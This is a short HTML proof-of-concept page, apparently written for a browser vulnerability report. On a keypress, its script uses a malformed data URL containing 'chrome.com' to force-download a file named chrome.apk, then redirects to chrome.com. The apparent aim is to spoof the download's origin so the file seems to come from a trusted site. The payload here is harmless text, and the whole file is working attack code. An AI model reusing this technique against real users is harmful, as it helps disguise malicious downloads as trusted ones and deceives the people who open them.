<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>POC Malformed Data URL</title>
  <style>
    body {
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: sans-serif;
      font-size: 22px;
    }
  </style>
</head>

<body>

<h2>POC by Chigorin!</h2>
<p>Press any key to continue</p>

<script>
window.addEventListener('keydown', function () {

  // isi file aman (PoC)
  const content = "HALO INI POC";
  const base64 = btoa(content);

  // trigger download pakai malformed data URL
  const a = document.createElement("a");
  a.href = `data://chrome.com/application/x-msdownload;base64,${base64}`;
  a.download = "chrome.apk"; // extension APK, isi teks
  document.body.appendChild(a);
  a.click();
  a.remove();

  // redirect setelah download toast muncul
  setTimeout(() => {
    window.location.href = "https://chrome.com";
  }, 300);

}, { once: true });
</script>

</body>
</html>
